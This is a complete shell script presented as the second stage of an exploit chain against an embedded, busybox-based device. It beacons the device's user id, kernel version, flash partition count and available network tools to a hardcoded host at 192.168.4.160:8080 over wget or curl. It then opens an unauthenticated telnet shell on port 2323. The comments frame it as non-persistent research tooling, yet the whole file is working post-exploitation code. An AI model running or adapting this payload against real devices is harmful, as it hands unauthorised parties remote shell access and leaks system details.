#!/bin/sh
# Second stage, fetched and run by the process-channel launch.sh. Everything here is observable
# from the operator side; nothing writes to flash.
H=192.168.4.160
P=8080
BB=""
for c in /tmp/Upgrade/busybox /bin/busybox /usr/bin/busybox busybox; do
    [ -x "$c" ] && { BB=$c; break; }
done
say() { "$BB" wget -q -O /dev/null "http://$H:$P/fss-stage2?$1" 2>/dev/null || \
        curl -s -m 5 -o /dev/null "http://$H:$P/fss-stage2?$1" 2>/dev/null; }

say "uid=$(id -u)&uname=$(uname -r | tr -d ' ')"
[ -n "$BB" ] && say "busybox=yes" || say "busybox=no"
say "mtd=$(grep -c . /proc/mtd 2>/dev/null)"
say "tools=$(for t in nc telnetd dropbear sshd wget curl; do command -v $t >/dev/null 2>&1 && printf '%s,' $t; done)"

# a shell on 2323 if anything can serve one
if [ -n "$BB" ]; then
    "$BB" telnetd -p 2323 -l /bin/sh 2>/dev/null && say "telnetd=up"
fi
